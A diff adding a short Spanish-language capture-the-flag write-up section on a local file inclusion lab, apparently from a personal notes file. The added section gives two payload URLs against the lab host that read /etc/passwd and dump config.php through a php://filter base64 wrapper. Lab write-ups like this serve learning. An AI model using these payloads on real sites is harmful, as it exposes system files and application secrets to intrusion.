@@ -46,6 +46,17 @@ print (open("flag.txt", "r").read())
 
 ```
 
+## LFI Challenge PHP Wrappers
+
+Pues este es un lab algo sencillo no hay cosa que no se alla visto  
+
+
+```
+http://lfi-tutorial.echocity-f.com/?page=/etc/passwd
+http://lfi-tutorial.echocity-f.com/?page=php://filter/convert.base64-encode/resource=config.php
+
+```
+
 
 
 
